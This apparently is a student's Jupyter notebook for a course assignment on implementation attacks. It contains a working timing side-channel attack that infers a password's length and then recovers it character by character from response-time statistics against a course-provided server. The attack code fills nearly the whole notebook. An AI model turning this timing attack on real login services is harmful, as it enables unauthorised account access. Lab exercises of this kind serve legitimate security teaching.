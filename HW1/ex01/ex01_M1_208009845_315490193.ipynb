{
  "cells": [
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "pCkdzAj_9F1x"
      },
      "outputs": [],
      "source": [
        "import time\n",
        "import string\n",
        "import random\n",
        "import requests\n",
        "from statistics import median, stdev\n",
        "from datetime import datetime\n",
        "from scipy import stats"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "8Cw_4k9P8ww8"
      },
      "source": [
        "## Commands used for docker\n",
        "```bash\n",
        "docker pull amarmic/attacks_on_implementations:Assignment1_x86_64\n",
        "docker run --name ass1 -p 80:8080 amarmic/attacks_on_implementations:Assignment1_x86_64\n",
        "```\n",
        "\n",
        "## Commands used for Anaconda to test locally\n",
        "```bash\n",
        "conda create --name side_attacks python=3.12\n",
        "conda install requests\n",
        "```"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "EzaHMFtg9IRQ"
      },
      "outputs": [],
      "source": [
        "BASE_URL = \"http://aoi-assignment1.oy.ne.ro:8080\"\n",
        "# BASE_URL = \"http://localhost\"\n",
        "USERNAME = \"321892408\"\n",
        "CHARSET = string.ascii_lowercase\n",
        "REPEATS = 3\n",
        "INITIAL_REPEATS = 3\n",
        "CHECK_LENGTH_REPEATS = 3\n",
        "PASSWORD_LENGTH = 11\n",
        "DIFFICULTY = 1\n",
        "ALPHA = 0.005\n",
        "MAX_PASSWORD_LENGTH = 36"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "rNN5eGho9UVG"
      },
      "outputs": [],
      "source": [
        "def find_password_length():\n",
        "    results = [[] for _ in range(MAX_PASSWORD_LENGTH - 1)]\n",
        "    for length in range(1, MAX_PASSWORD_LENGTH):\n",
        "        password = \"a\" * length\n",
        "        for _ in range(CHECK_LENGTH_REPEATS):\n",
        "            t, response = time_request(password)\n",
        "            if response == \"1\":\n",
        "                return length, password\n",
        "            results[length - 1].append(t)\n",
        "\n",
        "    avg_times = [sum(lst)/len(lst) for lst in results]\n",
        "    best_len = avg_times.index(max(avg_times)) + 1\n",
        "    return best_len, \"\""
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "pCWNGAAC9aR-"
      },
      "outputs": [],
      "source": [
        "def t_test(data, best_time):\n",
        "    t_stat, p_val = stats.ttest_1samp(data, best_time, alternative='less')\n",
        "    if p_val < ALPHA:\n",
        "        return True\n",
        "    return False"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "VHMWHGbo9bwb"
      },
      "outputs": [],
      "source": [
        "def time_request(password_guess):\n",
        "    url = f\"{BASE_URL}/?user={USERNAME}&password={password_guess}&difficulty={DIFFICULTY}\"\n",
        "    while True:\n",
        "        try:\n",
        "            start = time.time()\n",
        "            response = requests.get(url)\n",
        "            end = time.time()\n",
        "            response.raise_for_status()\n",
        "            return end - start, response.text.strip()\n",
        "        except requests.exceptions.RequestException as e:\n",
        "            # print(f\"Error during request: {e}\")\n",
        "            time.sleep(random.randint(1, 3))"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "id": "i9AuQBcNWTQc"
      },
      "outputs": [],
      "source": [
        "def time_trial(trial, repeats=REPEATS, transform=True):\n",
        "    times = []\n",
        "    for _ in range(repeats):\n",
        "        t, response = time_request(trial)\n",
        "        if response == \"1\":\n",
        "            return response, 0\n",
        "        times.append(pow(t + 7, 2) if transform else t)\n",
        "    return \"0\", median(times)"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "xo8ZlDj-AtK5"
      },
      "source": [
        "# Connectivity Test"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "MTweasDC_DO8",
        "outputId": "e6dd17b9-85b5-4c9d-cf87-dab56e628235"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Response:  http://aoi-assignment1.oy.ne.ro:8080/?user=321892408&password=parshandata\n",
            "incorrect password\n"
          ]
        }
      ],
      "source": [
        "password = \"parshandata\"\n",
        "response = requests.get(f\"{BASE_URL}/?user={USERNAME}&password={password}\")\n",
        "print(\"Response: \", response.url)\n",
        "if response.status_code != 200 : # sanity check\n",
        "  print(\"Error: \", response.status_code)\n",
        "\n",
        "if response.text == \"1\":\n",
        "   print(\"correct password\")\n",
        "else:\n",
        "   print(\"incorrect password\")"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": null,
      "metadata": {
        "colab": {
          "background_save": true,
          "base_uri": "https://localhost:8080/"
        },
        "id": "NKWWMwGQ7_FX",
        "outputId": "b9fd7280-cb51-4ecf-bf71-0309bc7d3ce0"
      },
      "outputs": [
        {
          "name": "stdout",
          "output_type": "stream",
          "text": [
            "enter username: 321892408\n"
          ]
        }
      ],
      "source": [
        "def guess_password():\n",
        "    guessed = \"\"\n",
        "    min_margin_seconds = 0.25\n",
        "    do_not_check = [set() for _ in range(MAX_PASSWORD_LENGTH)]\n",
        "    check_all_letters = False\n",
        "\n",
        "    # First round: test all characters fully to compute margin\n",
        "    timings = []\n",
        "    for c in CHARSET:\n",
        "        trial = guessed + c + 'a' * (PASSWORD_LENGTH - 1)\n",
        "        # print(f\"Trying first round: {trial}\")\n",
        "        response, score = time_trial(trial, repeats=INITIAL_REPEATS)\n",
        "        if response == \"1\":\n",
        "            return trial\n",
        "        timings.append((score, c))\n",
        "\n",
        "    timings.sort(reverse=True)\n",
        "    best, best_c = timings[0]\n",
        "    second = timings[1][0]\n",
        "    third = timings[2][0]\n",
        "    guessed += best_c\n",
        "    min_margin_seconds = ((best - second) + (best - third)) / 2 * 0.8\n",
        "\n",
        "    # Main loop\n",
        "    while len(guessed) < PASSWORD_LENGTH:\n",
        "        timings = []\n",
        "        position = len(guessed)\n",
        "        if check_all_letters:\n",
        "            min_margin_seconds *= 0.75\n",
        "            min_samples_to_early_stop = CHARSET.__len__()\n",
        "        else:\n",
        "            min_samples_to_early_stop = 5 if position <= 10 else 7\n",
        "\n",
        "        for i, c in enumerate(CHARSET):\n",
        "            if c in do_not_check[position]:\n",
        "                continue\n",
        "\n",
        "            trial = guessed + c + 'a' * (PASSWORD_LENGTH - position - 1)\n",
        "            # print(f\"Trying: {trial}\")\n",
        "            response, score = time_trial(trial, repeats=1)\n",
        "            if response == \"1\":\n",
        "                return trial\n",
        "            timings.append((score, c))\n",
        "\n",
        "            # Early outlier detection\n",
        "            if len(timings) >= min_samples_to_early_stop:\n",
        "                sorted_timings = sorted(timings, reverse=True)\n",
        "                best_score, best_c = sorted_timings[0]\n",
        "                second = sorted_timings[1][0]\n",
        "                third = sorted_timings[2][0]\n",
        "                avg_top = (second + third) / 2\n",
        "\n",
        "                if best_score - avg_top > min_margin_seconds:\n",
        "                    # Confirm it's not noise\n",
        "                    trial_confirm = guessed + best_c + 'a' * (PASSWORD_LENGTH - position - 1)\n",
        "                    # print(f\"Verifying: {trial_confirm}\")\n",
        "                    _, med_best = time_trial(trial_confirm, repeats=REPEATS)\n",
        "                    if med_best - avg_top > min_margin_seconds:\n",
        "                        guessed += best_c\n",
        "                        # print(f\"Confirmed: {guessed}\")\n",
        "                    else:\n",
        "                        # Replace only the original score\n",
        "                        timings = [(med_best, char) if char == best_c else (s, char) for (s, char) in timings]\n",
        "                    if check_all_letters:\n",
        "                        min_margin_seconds *= 1.6\n",
        "                        check_all_letters = False\n",
        "                    break\n",
        "        if len(guessed) + 1 == PASSWORD_LENGTH:\n",
        "            for c in CHARSET:\n",
        "                trial = guessed + c\n",
        "                response, score = time_trial(trial, repeats=1)\n",
        "                if response == \"1\":\n",
        "                    return trial\n",
        "            check_all_letters = True\n",
        "            do_not_check[position].add(guessed[-1])\n",
        "            guessed = guessed[:-1]\n",
        "            continue\n",
        "        if len(timings) == CHARSET.__len__():\n",
        "            # Didn't find clear outlier, fallback\n",
        "            best_score, best_c = sorted(timings, reverse=True)[0]\n",
        "            trial = guessed + best_c + 'a' * (PASSWORD_LENGTH - position - 1)\n",
        "            if t_test([t[0] for t in timings], best_score):\n",
        "                guessed += best_c\n",
        "                check_all_letters = False\n",
        "            else:\n",
        "                check_all_letters = True\n",
        "                do_not_check[position].add(guessed[-1])\n",
        "                guessed = guessed[:-1]\n",
        "\n",
        "    return guessed\n",
        "\n",
        "if __name__ == \"__main__\":\n",
        "    USERNAME = input(\"enter username: \")\n",
        "    PASSWORD_LENGTH, early_guess = find_password_length()\n",
        "    if early_guess:\n",
        "        print(early_guess)\n",
        "    else:\n",
        "        password = guess_password()\n",
        "        print(password)"
      ]
    }
  ],
  "metadata": {
    "colab": {
      "provenance": []
    },
    "kernelspec": {
      "display_name": "Python 3",
      "name": "python3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "nbformat": 4,
  "nbformat_minor": 0
}